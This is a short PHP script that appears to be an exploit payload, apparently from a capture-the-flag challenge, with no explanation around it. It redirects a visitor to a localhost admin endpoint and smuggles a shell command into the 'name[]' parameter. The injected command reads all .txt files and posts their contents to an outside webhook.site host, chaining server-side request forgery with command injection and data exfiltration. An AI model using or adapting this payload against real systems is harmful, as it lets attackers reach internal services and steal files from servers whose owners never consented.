<?php
$cmd = "cat *.txt";
$name = "$(curl https://webhook.site/1974e436-0730-4c8a-8bb1-368701e992ae --data \"$($cmd)\")";
$url = "http://127.0.0.1/api/admin/service_info?name[]=$name";
header("Location: $url");
?>